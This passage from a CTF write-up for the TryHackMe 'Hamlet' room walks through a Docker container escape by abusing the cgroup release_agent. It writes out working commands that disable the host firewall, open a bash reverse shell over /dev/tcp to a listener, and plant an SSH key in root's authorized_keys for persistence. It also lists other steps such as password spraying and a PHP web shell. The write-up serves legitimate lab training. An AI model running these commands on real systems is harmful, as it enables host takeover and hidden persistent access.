cat /os the output/w/cgroup.procs"; sleep 1s
> EOF
root@66505608bd11:/tmp# chmod +x /tmp/release_agent_breakout_1.sh
```

**Then run it:**
```shell
root@66505608bd11:/tmp# /tmp/release_agent_breakout_1.sh 
root@66505608bd11:/tmp# 
```

Nothing?

**After googling a little bit, I found [this](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/official-walkthrough.md) works:**
```bash
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**We can modify the PoC:**
```sh
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Disable ufw
echo '#!/bin/bash' > /cmd
echo "ufw --force disable" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.9.0.253/1564 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

This will have a reverse shell to the host machine, as we disabled the `ufw`.

**Then, setup a listener:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|13:00:14]
└> nc -lnvp 1564 
listening on [any] 1564 ...
```

**Run the Poc:**
```shell
root@66505608bd11:/tmp# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
mkdir: cannot create directory '/tmp/cgrp': File exists
root@66505608bd11:/tmp# echo 1 > /tmp/cgrp/x/notify_on_release
root@66505608bd11:/tmp# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@66505608bd11:/tmp# echo "$host_path/cmd" > /tmp/cgrp/release_agent
root@66505608bd11:/tmp# echo '#!/bin/bash' > /cmd
root@66505608bd11:/tmp# echo "ufw --force disable" >> /cmd
root@66505608bd11:/tmp# chmod a+x /cmd
root@66505608bd11:/tmp# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@66505608bd11:/tmp# echo '#!/bin/bash' > /cmd
root@66505608bd11:/tmp# echo "bash -i >& /dev/tcp/10.9.0.253/1564 0>&1" >> /cmd
root@66505608bd11:/tmp# chmod a+x /cmd
root@66505608bd11:/tmp# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|13:00:14]
└> nc -lnvp 1564 
listening on [any] 1564 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.207.238] 53644
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@hamlet:/# whoami;hostname;id;ip a
whoami;hostname;id;ip a
root
hamlet
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:e1:51:f8:a1:6d brd ff:ff:ff:ff:ff:ff
    inet 10.10.207.238/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2821sec preferred_lft 2821sec
    inet6 fe80::e1:51ff:fef8:a16d/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:1c:3c:80:a7 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:1cff:fe3c:80a7/64 scope link 
       valid_lft forever preferred_lft forever
5: vethc600557@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether fe:11:50:ff:e6:4d brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::fc11:50ff:feff:e64d/64 scope link 
       valid_lft forever preferred_lft forever
7: veth384f03d@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 36:cf:c7:12:15:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::34cf:c7ff:fe12:1507/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

**Let's get a stable shell via adding a public SSH key in `/root/.ssh`!**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet)-[2023.01.19|12:55:47]
└> mkdir .ssh;cd .ssh
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet/.ssh)-[2023.01.19|13:02:52]
└> ssh-keygen                                      
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/ctf/thm/ctf/Hamlet/.ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/ctf/thm/ctf/Hamlet/.ssh/id_rsa
Your public key has been saved in /root/ctf/thm/ctf/Hamlet/.ssh/id_rsa.pub
[...]
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet/.ssh)-[2023.01.19|13:03:00]
└> cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBzRQwC/qrrYwLuh6GDdv6DgJEAAM18YS+XkAeYkGBJXtjlP6DngHY+R0p3eXO8WsBosJpppiuNKmjL7JyA29V5AOoY8Bu5acTOjL/oebg8WpcCSPZTeOKzskt1oX3mJFOyIc1ocjWoYqjEZS6MnetMF4RATpFFoFuPtF1pULNqRaM+trkIdvYxKzw6eD6Y4Ire5syH+wwNhGZsFeon5o03iVHsrhOih9wmdHBGh1RC9qkX9TvT4PvdaFosxDHsSnAhY2riodxx+xeFbTS67C/hjAK4fTEM3qVE3DpzeQz9QzGP2159yNbSNxUFwaMoYRFTGOZ8zD2+YMD/z/lsWPwzzCjkYcJlOPkjuIjDP75U5c9FR4xk6+VMPF6bVPMc8QNYJWVFghog4vv8J4n1KQreIgVBDeuiM0TnFvqpi3p7U3gv7F9hZBuGMKincS3l8RmDEitYep+E5CQHwEC2qJS3hyr8iIrffeBcwXchArX20h4vk2wKLucaAM4RchIq2k= root@siunam
```

```shell
root@hamlet:/# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBzRQwC/qrrYwLuh6GDdv6DgJEAAM18YS+XkAeYkGBJXtjlP6DngHY+R0p3eXO8WsBosJpppiuNKmjL7JyA29V5AOoY8Bu5acTOjL/oebg8WpcCSPZTeOKzskt1oX3mJFOyIc1ocjWoYqjEZS6MnetMF4RATpFFoFuPtF1pULNqRaM+trkIdvYxKzw6eD6Y4Ire5syH+wwNhGZsFeon5o03iVHsrhOih9wmdHBGh1RC9qkX9TvT4PvdaFosxDHsSnAhY2riodxx+xeFbTS67C/hjAK4fTEM3qVE3DpzeQz9QzGP2159yNbSNxUFwaMoYRFTGOZ8zD2+YMD/z/lsWPwzzCjkYcJlOPkjuIjDP75U5c9FR4xk6+VMPF6bVPMc8QNYJWVFghog4vv8J4n1KQreIgVBDeuiM0TnFvqpi3p7U3gv7F9hZBuGMKincS3l8RmDEitYep+E5CQHwEC2qJS3hyr8iIrffeBcwXchArX20h4vk2wKLucaAM4RchIq2k= root@siunam' > /root/.ssh/authorized_keys
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Hamlet/.ssh)-[2023.01.19|13:03:04]
└> ssh -i id_rsa root@$RHOSTS
[...]
root@hamlet:~#
```

Nice! We have persistence access to the target machine!

## Rooted

**Flag 6:**
```shell
root@hamlet:/# cat /root/flag
THM{6_Redacted}
```

# Conclusion

What we've learned:

1. Enumerating FTP
2. Viewing Web Crawler File `robots.txt`
3. Brute Forcing Login Password Via Custom Python Script
4. Password Spraying
5. Remote Code Execution (RCE) Via Uploading PHP Web Shell In WebAnno
6. Horizontal Privilege Escalation Via SUID `/bin/cat` Binary & Cracking `/etc/shadow` Password Hash
7. Docker Breakout Via Abusing `release_agent`